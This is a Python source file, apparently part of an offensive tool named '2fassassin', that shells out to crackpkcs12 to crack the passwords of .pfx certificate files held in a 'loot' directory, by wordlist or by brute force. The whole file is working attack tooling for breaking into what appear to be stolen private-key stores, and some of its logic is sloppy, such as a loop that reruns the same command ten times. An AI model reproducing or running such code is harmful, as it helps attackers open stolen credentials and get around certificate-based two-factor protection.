#!/usr/bin/env python

import os, sys, re
from glob import glob
import Colour
import subprocess
from subprocess import Popen
import os.path



def crack():
    wordlist = "/root/2fassassin/crack/wordlist/2fa-wordlist.txt"
    target = "/root/2fassassin/loot/*.pfx"
    sign = ""
    sign += "crackpkcs12 -v -d"
    sign += " "
    sign += wordlist
    sign += " "
    sign += target
    sign += "| tee crack.log"
    os.system(sign); tail("crack.log")
    sys.exit()


def tail(filepath):
    with open(filepath, "rb") as f:
        first = f.readline()
        f.seek(-3, 2)
        while f.read(1) != b"\n":
            try:
                f.seek(-2, 2)
            except IOError:
                f.seek(-1, 1)
                if f.tell() == 0:
                    break
        last = f.readline()
    return last


def bruteforce():
    import progressbar
    from time import sleep
    bar = progressbar.ProgressBar(maxval=60, \
        widgets=[progressbar.Bar('==', '[', ']'), ' ', progressbar.Percentage()])
    bar.start()
    for i in xrange(10):
        bar.update(i+1)
        sleep(0.05)
        wordlist = "/root/2fassassin/crack/wordlist/2fa-wordlist.txt"
        target = "/root/2fassassin/loot/*.pfx"
        sign = ""
        sign += "crackpkcs12 -v -b"
        sign += " "
        sign += target
        sign += "| tee crack.log"
        os.system(sign)
    bar.finish()
    sys.exit()


__all__ = ['crack', 'bruteforce', 'tail']
